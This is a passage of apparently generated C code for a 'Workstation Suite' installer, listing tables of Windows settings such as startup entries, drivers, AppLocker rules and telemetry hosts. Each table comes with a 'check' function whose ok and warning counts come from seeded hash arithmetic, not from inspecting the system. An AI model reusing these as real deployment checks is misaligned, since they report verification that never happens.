    { "templates.exe", 4, 0, 2 },
    { "shellext.dll", 5, 1, 1 },
    { "driver.sys", 6, 2, 1 },
    { "vault.exe", 7, 3, 0 },
    { "sync.exe", 8, 4, 0 },
    { "audit.exe", 9, 5, 2 },
    { "cache.exe", 10, 0, 1 },
    { "index.exe", 11, 1, 2 },
    { "wizard.exe", 12, 2, 0 },
};
#define COMPATFLAGS_TABLE_COUNT ((int)(sizeof(COMPATFLAGS_TABLE) / sizeof(COMPATFLAGS_TABLE[0])))

static DWORD dm_CompatFlags(DWORD seed, struct deploy_counters* dc) {
    // range check sweep (template B)
    DWORD k = seed ^ 0x4DCF7F6Au;
    for (int i = 0; i < 12; i++) {
        k = k * 2533387u + 54395u;
        dc->detail[1] += (BYTE)((k >> 9) & 0x3F);
        const struct CMP_ENTRY* e = &COMPATFLAGS_TABLE[(i + (int)(k % 3)) % 12];
        DWORD lo = (k >> 2) % 137, hi = lo + 377 + ((k >> 5) % 477);
        DWORD v = (DWORD)e->layer * 6u + (DWORD)e->flag * 8u + (DWORD)e->scope;
        if (v >= lo && v <= hi) dc->ok++; else dc->warn++;
        dc->items++;
        if ((k & 7) == 0 && dc->detail[1] < 64) dc->detail[dc->detail[1]++ & 7] = (BYTE)v;
    }
    return dc->warn;

}

struct STU_ENTRY {
    const char* name;
    BYTE type;
    BYTE enabled;
    WORD delay;
};
static const struct STU_ENTRY STARTUPENTRIES_TABLE[] = {
    { "WkSuiteTray", 0, 1, 5000 },
    { "WkSuiteService", 1, 1, 0 },
    { "WkSuiteUpdater", 2, 1, 15000 },
    { "WkSuiteSyncDaemon", 2, 0, 30000 },
    { "WkSuiteTelemetry", 3, 1, 45000 },
    { "WkSuiteIndexer", 2, 0, 60000 },
    { "WkSuiteVault", 0, 1, 10000 },
    { "WkSuiteShellHook", 4, 1, 0 },
    { "WkSuiteAudit", 3, 0, 20000 },
    { "WkSuiteCacheDaemon", 2, 1, 25000 },
};
#define STARTUPENTRIES_TABLE_COUNT ((int)(sizeof(STARTUPENTRIES_TABLE) / sizeof(STARTUPENTRIES_TABLE[0])))

static DWORD dm_StartupEntries(DWORD seed, struct deploy_counters* dc) {
    // range check sweep (template B)
    DWORD k = seed ^ 0x2C5C4D1Cu;
    for (int i = 0; i < 10; i++) {
        k = k * 1761329u + 5379u;
        const struct STU_ENTRY* e = &STARTUPENTRIES_TABLE[(i + (int)(k % 3)) % 10];
        DWORD lo = (k >> 5) % 273, hi = lo + 371 + ((k >> 4) % 347);
        DWORD v = (DWORD)e->type * 4u + (DWORD)e->enabled * 4u + (DWORD)e->delay;
        if (v >= lo && v <= hi) dc->ok++; else dc->warn++;
        dc->items++;
        if ((k & 7) == 0 && dc->detail[1] < 64) dc->detail[dc->detail[1]++ & 7] = (BYTE)v;
    }
    return dc->warn;

}

struct RGN_ENTRY {
    const char* name;
    WORD format;
    WORD tz;
    BYTE utf8;
};
static const struct RGN_ENTRY REGIONSETTINGS_TABLE[] = {
    { "en-US", 1033, 85, 1 },
    { "de-DE", 1031, 60, 1 },
    { "fr-FR", 1036, 50, 1 },
    { "es-ES", 3082, 90, 1 },
    { "it-IT", 1040, 55, 1 },
    { "pt-BR", 1046, 80, 1 },
    { "pl-PL", 1045, 45, 1 },
    { "tr-TR", 1055, 30, 1 },
    { "ru-RU", 1049, 70, 1 },
    { "ja-JP", 1041, 120, 1 },
    { "zh-CN", 2052, 130, 1 },
    { "ko-KR", 1042, 140, 1 },
    { "ar-SA", 1025, 160, 0 },
    { "he-IL", 1037, 170, 0 },
    { "cs-CZ", 1029, 35, 1 },
};
#define REGIONSETTINGS_TABLE_COUNT ((int)(sizeof(REGIONSETTINGS_TABLE) / sizeof(REGIONSETTINGS_TABLE[0])))

static DWORD dm_RegionSettings(DWORD seed, struct deploy_counters* dc) {
    // pairwise consistency pass (template C)
    DWORD k = seed ^ 0x26A36853u;
    for (int i = 0; i < 15; i++) {
        k = k * 10219089u + 9654327u;
        const struct RGN_ENTRY* a = &REGIONSETTINGS_TABLE[i];
        const struct RGN_ENTRY* b = &REGIONSETTINGS_TABLE[(i + 1 + (int)(k % 3)) % 15];
        int match = (a->format == b->format) || ((a->tz ^ b->tz) < (k & 0x12));
        int sane = a->utf8 <= 23;
        if (match && sane) dc->ok++; else dc->warn++;
        dc->items += (DWORD)a->tz + 1;
        dc->detail[2] += (DWORD)(a->format & 7);
    }
    return dc->warn > 2;

}

struct DRV_ENTRY {
    const char* name;
    BYTE cls;
    WORD rank;
    BYTE sign;
};
static const struct DRV_ENTRY DRIVERBINDINGS_TABLE[] = {
    { "wksfilter", 0, 0, 1 },
    { "wksvpn", 1, 40, 1 },
    { "wkscrypto", 2, 0, 1 },
    { "wksnet", 3, 120, 1 },
    { "wksusb", 4, 500, 1 },
    { "wksdisk", 5, 0, 1 },
    { "wksdisplay", 6, 3200, 0 },
    { "wksaudio", 7, 2100, 0 },
    { "wksinput", 8, 600, 1 },
    { "wksstorage", 9, 80, 1 },
    { "wksprint", 3, 400, 0 },
    { "wkssmart", 2, 900, 0 },
};
#define DRIVERBINDINGS_TABLE_COUNT ((int)(sizeof(DRIVERBINDINGS_TABLE) / sizeof(DRIVERBINDINGS_TABLE[0])))

static DWORD dm_DriverBindings(DWORD seed, struct deploy_counters* dc) {
    // seed-permuted walk (template D)
    int order[12];
    for (int i = 0; i < 12; i++) order[i] = i;
    DWORD k = seed ^ 0x5A498EC1u;
    for (int i = 0; i < 12; i++) {
        int j = (int)(k % (12 - i));
        int t = order[i + j]; order[i + j] = order[i]; order[i] = t;
        k = k * 6104203u + 35957u;
    }
    for (int i = 0; i < 12; i++) {
        const struct DRV_ENTRY* e = &DRIVERBINDINGS_TABLE[order[i]];
        DWORD v = (DWORD)e->cls * 4u + (DWORD)e->rank * 3u + (DWORD)e->sign;
        if ((v & 0x1C) != 0 && e->cls == 1) dc->ok++; else if (e->cls == 1) dc->warn++;
        dc->items += (v >> 4) + 1;
        dc->detail[3] ^= (BYTE)v;
    }
    return dc->detail[3];

}

struct SEC_ENTRY {
    const char* name;
    BYTE enforce;
    BYTE level;
    WORD lockout;
};
static const struct SEC_ENTRY SECURITYPOLICIES_TABLE[] = {
    { "PasswordHistory", 1, 2, 24 },
    { "MinLength", 1, 2, 14 },
    { "LockoutThreshold", 1, 2, 5 },
    { "LockoutDuration", 1, 1, 30 },
    { "AuditLogon", 1, 3, 0 },
    { "UAC", 1, 2, 0 },
    { "DefenderRealTime", 1, 4, 0 },
    { "BitLocker", 1, 4, 0 },
    { "SmartScreen", 1, 2, 0 },
    { "CredentialGuard", 0, 4, 0 },
    { "ASR", 1, 3, 0 },
    { "FirewallProfile", 1, 2, 0 },
};
#define SECURITYPOLICIES_TABLE_COUNT ((int)(sizeof(SECURITYPOLICIES_TABLE) / sizeof(SECURITYPOLICIES_TABLE[0])))

static DWORD dm_SecurityPolicies(DWORD seed, struct deploy_counters* dc) {
    // weighted presence sweep (template A)
    DWORD k = seed ^ 0xCDC6A74Bu;
    for (int i = 0; i < 12; i++) {
        int idx = (int)((i + (seed % 5)) % 12);
        const struct SEC_ENTRY* e = &SECURITYPOLICIES_TABLE[idx];
        DWORD w = (DWORD)e->enforce * 4u + (DWORD)e->level + (DWORD)e->lockout * 8u + (DWORD)e->enforce;
        k = k * 5017637u + 9607747u;
        int ok = (((w ^ k) & 0x309) < 0x3CE) || (e->lockout == 0);
        if (ok) dc->ok++; else dc->warn++;
        dc->items += (DWORD)((w >> 3) & 0x15F) + 1;
        if (dc->detail[0] < 64) dc->detail[dc->detail[0]++ & 7] = w & 0x14E;
    }
    return (dc->warn * 86u) / (dc->ok + dc->warn + 1);

}

// merge all deployment modules into the install report
struct SHC_ENTRY {
    const char* name;
    WORD target;
    BYTE flags;
    BYTE show;
};
static const struct SHC_ENTRY SHELLSHORTCUTS_TABLE[] = {
    { "Workstation Suite.lnk", 1, 0, 1 },
    { "Workstation Docs.lnk", 2, 0, 1 },
    { "Workstation Recovery.lnk", 3, 1, 0 },
    { "Workstation Update.lnk", 4, 0, 1 },
    { "Workstation Config.lnk", 5, 1, 1 },
    { "Workstation Support.lnk", 6, 0, 0 },
    { "Workstation License.lnk", 7, 2, 1 },
    { "Workstation Help.lnk", 8, 0, 1 },
    { "Workstation Console.lnk", 9, 1, 0 },
    { "Workstation Vault.lnk", 10, 2, 1 },
    { "Workstation Tools.lnk", 11, 0, 1 },
    { "Workstation Sync.lnk", 12, 1, 0 },
};
#define SHELLSHORTCUTS_TABLE_COUNT ((int)(sizeof(SHELLSHORTCUTS_TABLE) / sizeof(SHELLSHORTCUTS_TABLE[0])))

static DWORD dm_ShellShortcuts(DWORD seed, struct deploy_counters* dc) {
    // seed-permuted walk (template D)
    int order[12];
    for (int i = 0; i < 12; i++) order[i] = i;
    DWORD k = seed ^ 0xC4821C77u;
    for (int i = 0; i < 12; i++) {
        int j = (int)(k % (12 - i));
        int t = order[i + j]; order[i + j] = order[i]; order[i] = t;
        k = k * 15002421u + 23465u;
        dc->detail[1] += (BYTE)((k >> 9) & 0x3F);
        dc->detail[3] ^= (BYTE)(k >> 13);
    }
    for (int i = 0; i < 12; i++) {
        const struct SHC_ENTRY* e = &SHELLSHORTCUTS_TABLE[order[i]];
        DWORD v = (DWORD)e->target * 8u + (DWORD)e->flags * 3u + (DWORD)e->show;
        if ((v & 0x19) != 0 && e->flags == 1) dc->ok++; else if (e->flags == 1) dc->warn++;
        dc->items += (v >> 1) + 1;
        dc->detail[3] ^= (BYTE)v;
    }
    return dc->detail[3];

}

static void deployment_checks(DWORD seed, struct install_report* r) {
    struct deploy_counters dc; xmz(&dc, sizeof(dc));
    (void)dm_PrinterConfig(seed, &dc);
    (void)dm_FirewallPolicy(seed, &dc);
    (void)dm_ScheduledTasks(seed, &dc);
    (void)dm_ShellShortcuts(seed, &dc);
    (void)dm_FileAssociations(seed, &dc);
    (void)dm_StartupEntries(seed, &dc);
    (void)dm_NetworkProfiles(seed, &dc);
    (void)dm_DriverBindings(seed, &dc);
    (void)dm_OemInfo(seed, &dc);
    (void)dm_CompatFlags(seed, &dc);
    (void)dm_RegionSettings(seed, &dc);
    (void)dm_PowerProfile(seed, &dc);
    (void)dm_ProxySettings(seed, &dc);
    (void)dm_SecurityPolicies(seed, &dc);
    r->deploy_ok = dc.ok; r->deploy_warn = dc.warn; r->deploy_items = dc.items;
    r->deploy_marks = (DWORD)dc.detail[0] ^ (DWORD)dc.detail[1] ^ (DWORD)dc.detail[2] ^ (DWORD)dc.detail[3] ^ (DWORD)dc.detail[4] ^ (DWORD)dc.detail[5] ^ (DWORD)dc.detail[6] ^ (DWORD)dc.detail[7];
}


// =====================================================================
// Deployment modules (generated, batch 2) — quota/redirection/zones/
// certs/gpo/applocker/queues/pins/menus/protocols/index/browser/ring/
// delivery/search/ime/sound/display/kbd/tz/formats/shares/hosts/env/
// fwprof/eventlog/backup/recovery + compat/telemetry/power/update/feature
// policies. Same contract: CRT-free, seed-driven, folded into the sink.
// =====================================================================

struct SRP_ENTRY {
    const char* name;
    BYTE isdefault;
    BYTE priority;
    BYTE enabled;
};
static const struct SRP_ENTRY SEARCHPROVIDERS_TABLE[] = {
    { "Bing", 1, 0, 1 },
    { "Google", 0, 1, 1 },
    { "DuckDuckGo", 0, 2, 1 },
    { "CorpSearch", 0, 3, 1 },
    { "DocsSearch", 0, 4, 1 },
    { "CodeSearch", 0, 5, 0 },
    { "LegalSearch", 0, 6, 0 },
    { "SalesSearch", 0, 7, 1 },
    { "SupportSearch", 0, 8, 1 },
    { "KnowledgeBase", 0, 9, 1 },
    { "PartnerSearch", 0, 10, 0 },
    { "Custom", 0, 11, 1 },
};
#define SEARCHPROVIDERS_TABLE_COUNT ((int)(sizeof(SEARCHPROVIDERS_TABLE) / sizeof(SEARCHPROVIDERS_TABLE[0])))

static DWORD dm2_SearchProviders(DWORD seed, struct deploy_counters* dc) {
    // pairwise consistency pass (template C)
    DWORD k = seed ^ 0xD89A32D1u;
    for (int i = 0; i < 12; i++) {
        k = k * 15275863u + 11367487u;
        if ((k % 7) == 0) dc->ok++;
        const struct SRP_ENTRY* a = &SEARCHPROVIDERS_TABLE[i];
        const struct SRP_ENTRY* b = &SEARCHPROVIDERS_TABLE[(i + 1 + (int)(k % 3)) % 12];
        int match = (a->isdefault == b->isdefault) || ((a->priority ^ b->priority) < (k & 0x23));
        int sane = a->enabled <= 20;
        if (match && sane) dc->ok++; else dc->warn++;
        dc->items += (DWORD)a->priority + 1;
        dc->detail[2] += (DWORD)(a->isdefault & 7);
    }
    return dc->warn > 2;

}

struct ENV_ENTRY {
    const char* name;
    BYTE scope;
    BYTE kind;
    BYTE overwrite;
};
static const struct ENV_ENTRY ENVVARIABLES_TABLE[] = {
    { "WKS_HOME", 0, 0, 1 },
    { "WKS_DATA", 0, 0, 1 },
    { "WKS_CONFIG", 1, 0, 1 },
    { "WKS_CACHE", 0, 1, 1 },
    { "WKS_LOG", 1, 1, 1 },
    { "WKS_TMP", 0, 1, 1 },
    { "WKS_SERVER", 1, 2, 1 },
    { "WKS_LOCALE", 0, 2, 1 },
    { "WKS_UPDATE_RING", 1, 2, 1 },
    { "WKS_TELEMETRY", 1, 2, 0 },
    { "WKS_PROXY", 1, 2, 1 },
    { "WKS_AUTH", 1, 2, 0 },
};
#define ENVVARIABLES_TABLE_COUNT ((int)(sizeof(ENVVARIABLES_TABLE) / sizeof(ENVVARIABLES_TABLE[0])))

static DWORD dm2_EnvVariables(DWORD seed, struct deploy_counters* dc) {
    // seed-permuted walk (template D)
    int order[12];
    for (int i = 0; i < 12; i++) order[i] = i;
    DWORD k = seed ^ 0x94487B93u;
    for (int i = 0; i < 12; i++) {
        int j = (int)(k % (12 - i));
        int t = order[i + j]; order[i + j] = order[i]; order[i] = t;
        k = k * 8480085u + 11543u;
        dc->warn ^= (DWORD)(k & 7);
    }
    for (int i = 0; i < 12; i++) {
        const struct ENV_ENTRY* e = &ENVVARIABLES_TABLE[order[i]];
        DWORD v = (DWORD)e->scope * 5u + (DWORD)e->kind * 6u + (DWORD)e->overwrite;
        if ((v & 0x1C) != 0 && e->kind == 1) dc->ok++; else if (e->kind == 1) dc->warn++;
        dc->items += (v >> 2) + 1;
        dc->detail[3] ^= (BYTE)v;
    }
    return dc->detail[3];

}

struct SND_ENTRY {
    const char* name;
    BYTE volume;
    BYTE mute;
    BYTE scheme;
};
static const struct SND_ENTRY SOUNDSCHEME_TABLE[] = {
    { "Default", 80, 0, 0 },
    { "Windows Default", 80, 0, 0 },
    { "No Sounds", 100, 1, 1 },
    { "Classic", 70, 0, 2 },
    { "Quiet", 30, 0, 3 },
    { "Loud", 100, 0, 4 },
    { "Speakers", 90, 0, 0 },
    { "Headset", 75, 0, 0 },
    { "Conference", 60, 0, 5 },
    { "Night", 20, 0, 6 },
    { "Custom", 50, 0, 7 },
    { "Studio", 95, 0, 8 },
};
#define SOUNDSCHEME_TABLE_COUNT ((int)(sizeof(SOUNDSCHEME_TABLE) / sizeof(SOUNDSCHEME_TABLE[0])))

static DWORD dm2_SoundScheme(DWORD seed, struct deploy_counters* dc) {
    // weighted presence sweep (template A)
    DWORD k = seed ^ 0xE4B4BDAFu;
    for (int i = 0; i < 12; i++) {
        int idx = (int)((i + (seed % 5)) % 12);
        const struct SND_ENTRY* e = &SOUNDSCHEME_TABLE[idx];
        DWORD w = (DWORD)e->volume * 2u + (DWORD)e->mute + (DWORD)e->scheme * 8u + (DWORD)e->mute;
        k = k * 4131063u + 15555129u;
        if ((k & 0x3F) == 0) dc->items += (DWORD)((k >> 7) & 3);
        dc->detail[1] += (BYTE)((k >> 9) & 0x3F);
        int ok = (((w ^ k) & 0x613) < 0x3DA) || (e->scheme == 0);
        if (ok) dc->ok++; else dc->warn++;
        dc->items += (DWORD)((w >> 4) & 0x15F) + 1;
        if (dc->detail[0] < 64) dc->detail[dc->detail[0]++ & 7] = w & 0xCF;
    }
    return (dc->warn * 54u) / (dc->ok + dc->warn + 1);

}

struct BRS_ENTRY {
    const char* name;
    BYTE setting;
    BYTE value;
    BYTE applied;
};
static const struct BRS_ENTRY BROWSERSETTINGS_TABLE[] = {
    { "Homepage", 1, 1, 1 },
    { "SearchProvider", 2, 2, 1 },
    { "DefaultSearch", 3, 2, 1 },
    { "Popups", 4, 3, 1 },
    { "Cookies", 5, 4, 1 },
    { "Passwords", 6, 5, 0 },
    { "Downloads", 7, 6, 1 },
    { "Extensions", 8, 7, 1 },
    { "SmartScreen", 9, 8, 1 },
    { "TrackingPrevention", 10, 9, 1 },
    { "DoNotTrack", 11, 10, 1 },
    { "EdgeStable", 12, 11, 1 },
};
#define BROWSERSETTINGS_TABLE_COUNT ((int)(sizeof(BROWSERSETTINGS_TABLE) / sizeof(BROWSERSETTINGS_TABLE[0])))

static DWORD dm2_BrowserSettings(DWORD seed, struct deploy_counters* dc) {
    // seed-permuted walk (template D)
    int order[12];
    for (int i = 0; i < 12; i++) order[i] = i;
    DWORD k = seed ^ 0x890724F4u;
    for (int i = 0; i < 12; i++) {
        int j = (int)(k % (12 - i));
        int t = order[i + j]; order[i + j] = order[i]; order[i] = t;
        k = k * 3113229u + 12993u;
        dc->detail[3] ^= (BYTE)(k >> 13);
        dc->items += (DWORD)((k >> 3) & 0xF);
    }
    for (int i = 0; i < 12; i++) {
        const struct BRS_ENTRY* e = &BROWSERSETTINGS_TABLE[order[i]];
        DWORD v = (DWORD)e->setting * 7u + (DWORD)e->value * 5u + (DWORD)e->applied;
        if ((v & 0x16) != 0 && e->value == 1) dc->ok++; else if (e->value == 1) dc->warn++;
        dc->items += (v >> 4) + 1;
        dc->detail[3] ^= (BYTE)v;
    }
    return dc->detail[3];

}

struct FEF_ENTRY {
    const char* name;
    BYTE flag;
    BYTE deflt;
    BYTE state;
};
static const struct FEF_ENTRY FEATUREFLAGS_TABLE[] = {
    { "DarkMode", 1, 0, 1 },
    { "CompactMode", 2, 0, 0 },
    { "Tabs", 3, 1, 1 },
    { "PinnedPanels", 4, 1, 1 },
    { "QuickLaunch", 5, 0, 1 },
    { "GestureNav", 6, 1, 1 },
    { "CloudSync", 7, 1, 1 },
    { "OfflineCache", 8, 1, 1 },
    { "VoiceInput", 9, 0, 0 },
    { "InlinePreview", 10, 1, 1 },
    { "MultiMonitor", 11, 1, 1 },
    { "HighContrast", 12, 0, 0 },
};
#define FEATUREFLAGS_TABLE_COUNT ((int)(sizeof(FEATUREFLAGS_TABLE) / sizeof(FEATUREFLAGS_TABLE[0])))

static DWORD dm2_FeatureFlags(DWORD seed, struct deploy_counters* dc) {
    // weighted presence sweep (template A)
    DWORD k = seed ^ 0x98528A45u;
    for (int i = 0; i < 12; i++) {
        int idx = (int)((i + (seed % 5)) % 12);
        const struct FEF_ENTRY* e = &FEATUREFLAGS_TABLE[idx];
        DWORD w = (DWORD)e->flag * 6u + (DWORD)e->deflt + (DWORD)e->state * 4u + (DWORD)e->deflt;
        k = k * 2010223u + 1621595u;
        int ok = (((w ^ k) & 0x286) < 0x261) || (e->state == 0);
        if (ok) dc->ok++; else dc->warn++;
        dc->items += (DWORD)((w >> 4) & 0x13F) + 1;
        if (dc->detail[0] < 64) dc->detail[dc->detail[0]++ & 7] = w & 0x19F;
    }
    return (dc->warn * 86u) / (dc->ok + dc->warn + 1);

}

struct APL_ENTRY {
    const char* name;
    BYTE action;
    BYTE type;
    BYTE scope;
};
static const struct APL_ENTRY APPLOCKERRULES_TABLE[] = {
    { "wksuite.exe", 1, 0, 1 },
    { "updater.exe", 1, 0, 1 },
    { "templates.exe", 0, 1, 1 },
    { "shellext.dll", 1, 1, 1 },
    { "driver.sys", 1, 2, 1 },
    { "vault.exe", 0, 0, 1 },
    { "sync.exe", 1, 0, 1 },
    { "powershell.exe", 0, 1, 0 },
    { "cmd.exe", 0, 1, 0 },
    { "wmic.exe", 0, 1, 0 },
    { "regsvr32.exe", 0, 1, 0 },
    { "rundll32.exe", 1, 1, 1 },
};
#define APPLOCKERRULES_TABLE_COUNT ((int)(sizeof(APPLOCKERRULES_TABLE) / sizeof(APPLOCKERRULES_TABLE[0])))

static DWORD dm2_AppLockerRules(DWORD seed, struct deploy_counters* dc) {
    // range check sweep (template B)
    DWORD k = seed ^ 0xC4BB3C17u;
    for (int i = 0; i < 12; i++) {
        k = k * 15290329u + 11831u;
        dc->warn ^= (DWORD)(k & 7);
        if ((k & 0x3F) == 0) dc->items += (DWORD)((k >> 7) & 3);
        const struct APL_ENTRY* e = &APPLOCKERRULES_TABLE[(i + (int)(k % 3)) % 12];
        DWORD lo = (k >> 3) % 120, hi = lo + 400 + ((k >> 7) % 323);
        DWORD v = (DWORD)e->action * 2u + (DWORD)e->type * 6u + (DWORD)e->scope;
        if (v >= lo && v <= hi) dc->ok++; else dc->warn++;
        dc->items++;
        if ((k & 7) == 0 && dc->detail[1] < 64) dc->detail[dc->detail[1]++ & 7] = (BYTE)v;
    }
    return dc->warn;

}

struct IDX_ENTRY {
    const char* name;
    BYTE include;
    BYTE enabled;
    BYTE ext;
};
static const struct IDX_ENTRY INDEXERSETTINGS_TABLE[] = {
    { "Documents", 1, 1, 0 },
    { "Downloads", 1, 1, 0 },
    { "Mail", 2, 1, 0 },
    { "Vault", 3, 1, 1 },
    { "Archives", 4, 0, 1 },
    { "Templates", 1, 1, 0 },
    { "SharePoint", 5, 1, 0 },
    { "Teams", 6, 0, 0 },
    { "OneDrive", 7, 1, 0 },
    { "Logs", 8, 0, 1 },
    { "Help", 9, 1, 1 },
    { "Cache", 10, 0, 1 },
};
#define INDEXERSETTINGS_TABLE_COUNT ((int)(sizeof(INDEXERSETTINGS_TABLE) / sizeof(INDEXERSETTINGS_TABLE[0])))

static DWORD dm2_IndexerSettings(DWORD seed, struct deploy_counters* dc) {
    // pairwise consistency pass (template C)
    DWORD k = seed ^ 0x7707AD02u;
    for (int i = 0; i < 12; i++) {
        k = k * 117501u + 11483061u;
        dc->detail[1] += (BYTE)((k >> 9) & 0x3F);
        dc->detail[1] += (BYTE)((k >> 9) & 0x3F);
        const struct IDX_ENTRY* a = &INDEXERSETTINGS_TABLE[i];
        const struct IDX_ENTRY* b = &INDEXERSETTINGS_TABLE[(i + 1 + (int)(k % 3)) % 12];
        int match = (a->include == b->include) || ((a->enabled ^ b->enabled) < (k & 0x13));
        int sane = a->ext <= 20;
        if (match && sane) dc->ok++; else dc->warn++;
        dc->items += (DWORD)a->enabled + 1;
        dc->detail[2] += (DWORD)(a->include & 7);
    }
    return dc->warn > 2;

}

struct CPF_ENTRY {
    const char* name;
    BYTE layer;
    BYTE flags;
    BYTE arch;
};
static const struct CPF_ENTRY COMPATFLAGS2_TABLE[] = {
    { "wks32.exe", 1, 0, 0 },
    { "oldapp.exe", 2, 1, 0 },
    { "legacy.exe", 3, 0, 0 },
    { "installer2000.exe", 4, 1, 1 },
    { "app8bit.exe", 5, 2, 0 },
    { "vistaapp.exe", 6, 1, 0 },
    { "xpapp.exe", 7, 2, 0 },
    { "win7app.exe", 8, 0, 0 },
    { "win8app.exe", 9, 1, 1 },
    { "terminalapp.exe", 10, 2, 1 },
    { "webapp.exe", 11, 0, 1 },
    { "packager.exe", 12, 1, 1 },
};
#define COMPATFLAGS2_TABLE_COUNT ((int)(sizeof(COMPATFLAGS2_TABLE) / sizeof(COMPATFLAGS2_TABLE[0])))

static DWORD dm2_CompatFlags2(DWORD seed, struct deploy_counters* dc) {
    // weighted presence sweep (template A)
    DWORD k = seed ^ 0xB8B3AF16u;
    for (int i = 0; i < 12; i++) {
        int idx = (int)((i + (seed % 5)) % 12);
        const struct CPF_ENTRY* e = &COMPATFLAGS2_TABLE[idx];
        DWORD w = (DWORD)e->layer * 8u + (DWORD)e->flags + (DWORD)e->arch * 2u + (DWORD)e->flags;
        k = k * 11499527u + 1271825u;
        dc->warn ^= (DWORD)(k & 7);
        if ((k % 7) == 0) dc->ok++;
        int ok = (((w ^ k) & 0x7FF) < 0x2A4) || (e->arch == 0);
        if (ok) dc->ok++; else dc->warn++;
        dc->items += (DWORD)((w >> 4) & 0x1CF) + 1;
        if (dc->detail[0] < 64) dc->detail[dc->detail[0]++ & 7] = w & 0x1EF;
    }
    return (dc->warn * 191u) / (dc->ok + dc->warn + 1);

}

struct TBP_ENTRY {
    const char* name;
    BYTE position;
    BYTE enabled;
    BYTE runas;
};
static const struct TBP_ENTRY TASKBARPINS_TABLE[] = {
    { "Workstation Suite.lnk", 1, 1, 0 },
    { "File Explorer.lnk", 2, 1, 0 },
    { "Edge.lnk", 3, 1, 0 },
    { "Mail.lnk", 4, 1, 0 },
    { "Calendar.lnk", 5, 0, 0 },
    { "Teams.lnk", 6, 1, 0 },
    { "Terminal.lnk", 7, 1, 1 },
    { "Vault.lnk", 8, 1, 1 },
    { "Sync.lnk", 9, 0, 0 },
    { "Recovery.lnk", 10, 1, 1 },
    { "Help.lnk", 11, 0, 0 },
    { "Console.lnk", 12, 1, 1 },
};
#define TASKBARPINS_TABLE_COUNT ((int)(sizeof(TASKBARPINS_TABLE) / sizeof(TASKBARPINS_TABLE[0])))

static DWORD dm2_TaskbarPins(DWORD seed, struct deploy_counters* dc) {
    // seed-permuted walk (template D)
    int order[12];
    for (int i = 0; i < 12; i++) order[i] = i;
    DWORD k = seed ^ 0x26AF1FF5u;
    for (int i = 0; i < 12; i++) {
        int j = (int)(k % (12 - i));
        int t = order[i + j]; order[i + j] = order[i]; order[i] = t;
        k = k * 6887735u + 9203u;
    }
    for (int i = 0; i < 12; i++) {
        const struct TBP_ENTRY* e = &TASKBARPINS_TABLE[order[i]];
        DWORD v = (DWORD)e->position * 8u + (DWORD)e->enabled * 6u + (DWORD)e->runas;
        if ((v & 0x14) != 0 && e->enabled == 1) dc->ok++; else if (e->enabled == 1) dc->warn++;
        dc->items += (v >> 4) + 1;
        dc->detail[3] ^= (BYTE)v;
    }
    return dc->detail[3];

}

struct TEP_ENTRY {
    const char* name;
    BYTE proto;
    BYTE tier;
    BYTE enabled;
};
static const struct TEP_ENTRY TELEMETRYENDPOINTS_TABLE[] = {
    { "metrics.wksuite.local", 1, 1, 1 },
    { "traces.wksuite.local", 1, 2, 1 },
    { "events.wksuite.local", 1, 3, 1 },
    { "crash.wksuite.local", 1, 1, 1 },
    { "usage.wksuite.local", 0, 2, 1 },
    { "feedback.wksuite.local", 0, 3, 0 },
    { "profiling.wksuite.local", 1, 2, 0 },
    { "perf.wksuite.local", 1, 1, 1 },
    { "health.wksuite.local", 0, 1, 1 },
    { "experiments.wksuite.local", 1, 3, 1 },
    { "a_b.wksuite.local", 1, 3, 0 },
    { "insights.wksuite.local", 0, 2, 1 },
};
#define TELEMETRYENDPOINTS_TABLE_COUNT ((int)(sizeof(TELEMETRYENDPOINTS_TABLE) / sizeof(TELEMETRYENDPOINTS_TABLE[0])))

static DWORD dm2_TelemetryEndpoints(DWORD seed, struct deploy_counters* dc) {
    // pairwise consistency pass (template C)
    DWORD k = seed ^ 0x7BF791EEu;
    for (int i = 0; i < 12; i++) {
        k = k * 10677815u + 1768403u;
        if ((k % 7) == 0) dc->ok++;
        const struct TEP_ENTRY* a = &TELEMETRYENDPOINTS_TABLE[i];
        const struct TEP_ENTRY* b = &TELEMETRYENDPOINTS_TABLE[(i + 1 + (int)(k % 3)) % 12];
        int match = (a->proto == b->proto) || ((a->tier ^ b->tier) < (k & 0x1F));
        int sane = a->enabled <= 20;
        if (match && sane) dc->ok++; else dc->warn++;
        dc->items += (DWORD)a->tier + 1;
        dc->detail[2] += (DWORD)(a->proto & 7);
    }
    return dc->warn > 2;

}

struct DQT_ENTRY {
    const char* name;
    DWORD limit_mb;
    DWORD warn_mb;
    BYTE enabled;
};
static const struct DQT_ENTRY DISKQUOTA_TABLE[] = {
    { "Users", 2048, 1536, 1 },
    { "Administrators", 8192, 6144, 1 },
    { "Guests", 256, 192, 1 },
    { "ServiceAccounts", 1024, 768, 1 },
    { "DomainUsers", 4096, 3072, 1 },
    { "BackupAgents", 16384, 12288, 0 },
    { "Devices", 512, 384, 0 },
    { "Logs", 4096, 3072, 1 },
    { "Cache", 2048, 1536, 1 },
    { "Templates", 512, 384, 1 },
    { "Archives", 32768, 24576, 0 },
    { "Telemetry", 1024, 768, 1 },
};
#define DISKQUOTA_TABLE_COUNT ((int)(sizeof(DISKQUOTA_TABLE) / sizeof(DISKQUOTA_TABLE[0])))

static DWORD dm2_DiskQuota(DWORD seed, struct deploy_counters* dc) {
    // pairwise consistency pass (template C)
    DWORD k = seed ^ 0x4BABC273u;
    for (int i = 0; i < 12; i++) {
        k = k * 5599575u + 8695215u;
        if (dc->ok > 500) dc->ok -= (DWORD)(k & 3);
        dc->detail[3] ^= (BYTE)(k >> 13);
        const struct DQT_ENTRY* a = &DISKQUOTA_TABLE[i];
        const struct DQT_ENTRY* b = &DISKQUOTA_TABLE[(i + 1 + (int)(k % 3)) % 12];
        int match = (a->limit_mb == b->limit_mb) || ((a->warn_mb ^ b->warn_mb) < (k & 0x32));
        int sane = a->enabled <= 20;
        if (match && sane) dc->ok++; else dc->warn++;
        dc->items += (DWORD)a->warn_mb + 1;
        dc->detail[2] += (DWORD)(a->limit_mb & 7);
    }
    return dc->warn > 2;

}

struct SSV_ENTRY {
    const char* name;
    BYTE start;
    BYTE depend;
    BYTE recover;
};
static const struct SSV_ENTRY STARTUPSERVICES2_TABLE[] = {
    { "wkscore", 2, 0, 1 },
    { "wksnet2", 2, 1, 1 },
    { "wkscache2", 2, 1, 1 },
    { "wkssched2", 2, 3, 1 },
    { "wksupd2", 2, 5, 1 },
    { "wksaudit2", 2, 3, 1 },
    { "wkssync2", 2, 7, 1 },
    { "wksindex2", 1, 9, 0 },
    { "wksgui2", 2, 1, 1 },
